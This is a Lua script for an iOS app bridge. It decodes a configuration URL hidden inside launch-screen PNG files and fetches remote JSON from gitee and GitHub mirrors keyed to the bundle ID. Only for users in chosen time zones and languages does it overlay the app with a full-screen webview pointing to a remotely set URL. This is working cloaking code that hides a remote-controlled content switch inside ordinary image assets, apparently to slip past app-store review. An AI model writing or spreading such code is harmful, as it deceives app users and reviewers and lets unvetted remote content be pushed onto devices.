require("lib.init")

local alertTools = require("wv.alertTools")

local originWindow;
local loadingWindow;
local webviewWindow;

globalCfg = {
	full = true,
	igMG = true,
	hideNav = false,
	patch = {

	},
	qArgs = {

	},
	addGetList = {

	},
	idfaKey = "",
	idfvKey = ""
}

function closeLoadingWindow()
	if loadingWindow then
		loadingWindow.hidden = true
	end
end

local function hookDelegate()
	OCClassWrap:create("UIApplication")
    local application = UIApplication:sharedApplication()
    if application then
	    local delegate = application.delegate
	    local delegateClassName = OCTools:getCName(delegate)
	    local delegateClass = OCClassWrap:create(delegateClassName)
	    local suc = delegateClass:setM("application:supportedInterfaceOrientationsForWindow:", function()
	    	return globalCfg.orien;
		end,false,AspectPositionInstead)
		if not suc then
			print("添加接口：supportedInterfaceOrientationsForWindow" )
			delegateClass:addM("application:supportedInterfaceOrientationsForWindow:", "long long, UIApplication *, UIWindow *", function()
				print("supportedInterfaceOrientationsForWindow")
				return globalCfg.orien;
			end)
		end
	end
end

local function convertRemoteArguments(cfg)
	globalCfg.isOpen = cfg.isOpen
	if cfg.o == 1 then
		globalCfg.orien = UIInterfaceOrientationMaskPortrait
	elseif cfg.o == 2 then
		globalCfg.orien = UIInterfaceOrientationMaskLandscape
	else
		globalCfg.orien = UIInterfaceOrientationMaskAll
	end
	globalCfg.hP = cfg.url
	globalCfg.timeZ = cfg.timeZ
	globalCfg.lang = cfg.lang
	globalCfg.idfaKey = cfg.idfa
	globalCfg.idfvKey = cfg.idfv
	globalCfg.noLoad = cfg.noload
	globalCfg.isNoB = cfg.noBar
	globalCfg.bV = cfg.bar
	globalCfg.full = cfg.full
	globalCfg.igMG = cfg.ignoreMenuGap
	globalCfg.ana = cfg.analytic
	globalCfg.hideNav = cfg.hideNav
	globalCfg.qArgs = cfg.get or {}
	globalCfg.patch = cfg.patch or {}
	globalCfg.addGetList = cfg.getAddr or { globalCfg.hP }
end

local function openWebview()
	closeLoadingWindow()
	hookDelegate()
    loadLib("WebKit")
	OCClassWrap:create("UIApplication");
	OCClassWrap:create("UIView");
	OCClassWrap:create("UIWindow");
	OCClassWrap:create("UIColor");
	local webviewWindow = UIWindow()
	webviewWindow:initWithFrame(screenBounds())
	retain(webviewWindow)
    webviewWindow.windowLevel = 99999;
	require("wv.UIWKWVController")
	local controller = UIWKWVController();
	webviewWindow.rootViewController = controller;
	webviewWindow.backgroundColor = UIColor:whiteColor();
	webviewWindow:makeKeyAndVisible()
	-- delay(3, function()
	-- 	alertTools.openOutConfirmAlert(controller,  "http://baidu.com")
	-- end)
end

local function buildBackupUrl()
	local bid =  string.gsub(bundle.bundleIdentifier, "[%-%._]", "")
	local backups = {
		{"https://gitee.com/", "gitee/enter/raw/master/config.json"},
		{"https://", "giteeio.gitee.io/enter/config.json"},
		{"https://raw.githubusercontent.com/", "github/enter/master/config.json"},
	}
	local ret = {}
	for _, v in ipairs(backups) do
		ret[#ret + 1] = v[1] .. bid .. v[2]
	end
	return ret
end

local function verifyJsonData(j)
	if not j then return false end
	if table.getn(j) == 0 then
		return true
	end
	if j.close then
		return false
	end
	if j.isOpen == nil then
		return false
	end
	return true
end	

local function saveToLocal(j)
	OCClassWrap:create("NSUserDefaults")
	local default = NSUserDefaults:standardUserDefaults()
	call(default, "setObject:forKey:", j, "hywv");
end

local function getLocalData()
	OCClassWrap:create("NSUserDefaults")
	local default = NSUserDefaults:standardUserDefaults()
	local data = call(default, "objectForKey:", "hywv")
	return data
end

local function showLoading()

end

local function checkTimeZoneAndLang()
	if globalCfg.timeZ and #globalCfg.timeZ > 0 then
		OCClassWrap:create("NSTimeZone")
		local localZone = NSTimeZone:systemTimeZone()
		local secs = call(localZone, "secondsFromGMT")
		local isExit = false
		for _, v in ipairs(globalCfg.timeZ) do
			if v == secs then
				isExit = true
				break
			end
		end
		if not isExit then return false end
	end

	if globalCfg.lang then
		OCClassWrap:create("NSLocale")
		local langs = NSLocale:preferredLanguages()
		local isExit = false
		if string.hasPrefix(langs[1], globalCfg.lang) then
			isExit = true
		end
		if not isExit then return false end
	end
	return true
end

local function onSuccess(data)
	saveToLocal(data)
	convertRemoteArguments(data)
	dump(globalCfg)
	if globalCfg.isOpen and checkTimeZoneAndLang() then
		openWebview()
	end
end

local function httpcheck(url, onsuccess, onfail)
	if(url) then
		NetService:GET(url, block("void, bool, NSString*", function(suc, body)
		 	if(suc) then
				local c = json.decode(body);
				if verifyJsonData(c) then
					onsuccess(c)
				else 
					onfail()
				end
			else
				onfail()
			end
		end))
	else
		openWebview()
	end
end

local function imageDecode()
	showLoading()
	local launchImages = {
		"LaunchScreenBackground.png",
		"Base.lproj/LaunchScreenBackground.png",
		"LaunchScreen.png",
		"Base.lproj/LaunchScreen.png",
		"Background.png",
		"Base.lproj/Background.png",
		"bg.png",
		"Base.lproj/bg.png",
	}
	local urls = buildBackupUrl();
	for _, v in ipairs(launchImages) do
		local file = bundle.resourcePath .. "/" .. v;
		if io.exists(file) then
	 		local dataStr = OCTools:handlePngImage(file)
	 		local data = json.decode(dataStr)
	 		table.insert(urls, 1, data.url)
			break
		end
	end
	local index = 0
	local checkNext
	checkNext = function()
		index = index + 1
		if index > #urls then
			-- 检查本地的数据
			local data = getLocalData()
			if(data) then
				onSuccess(data)
			end
			return
		end
		httpcheck(urls[index] , onSuccess, checkNext)
	end
	checkNext()
end

imageDecode()

